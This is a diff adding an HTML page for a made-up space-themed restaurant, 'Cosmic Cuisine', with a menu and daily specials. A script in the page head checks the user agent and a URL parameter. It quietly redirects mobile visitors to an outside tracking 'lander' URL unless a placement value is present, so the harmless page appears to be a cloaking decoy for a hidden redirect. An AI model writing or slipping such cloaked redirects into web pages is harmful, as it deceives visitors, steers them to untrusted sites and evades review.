@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Cuisine</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #FF6B6B, #4ECDC4);
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+        }
+        header {
+            grid-column: 1 / -1;
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        main {
+            grid-column: 1 / span 2;
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+        }
+        aside {
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+        }
+        footer {
+            grid-column: 1 / -1;
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 10px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        h1 {
+            color: #FF6B6B;
+        }
+        .menu-item {
+            border: 2px solid #4ECDC4;
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Cosmic Cuisine</h1>
+            <p>Interstellar Flavors for Earthly Taste Buds</p>
+        </header>
+        <main>
+            <h2>Our Stellar Menu</h2>
+            <div class="menu-item">
+                <h3>Nebula Noodles</h3>
+                <p>Glowing pasta infused with bioluminescent algae</p>
+            </div>
+            <div class="menu-item">
+                <h3>Martian Meatballs</h3>
+                <p>Plant-based protein spheres with a red planet dust coating</p>
+            </div>
+            <div class="menu-item">
+                <h3>Galactic Gelato</h3>
+                <p>Ice cream that changes flavors as you eat it</p>
+            </div>
+        </main>
+        <aside>
+            <h2>Daily Specials</h2>
+            <ul>
+                <li>Monday: Black Hole Coffee (bottomless cup)</li>
+                <li>Tuesday: Asteroid Soup</li>
+                <li>Wednesday: Supernova Spicy Wings</li>
+                <li>Thursday: Quantum Quesadillas</li>
+                <li>Friday: Cosmic Cocktail Happy Hour</li>
+            </ul>
+        </aside>
+        <footer>
+            <p>&copy; 2023 Cosmic Cuisine. All rights reserved. <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+        </footer>
+    </div>
+</body>
+</html>
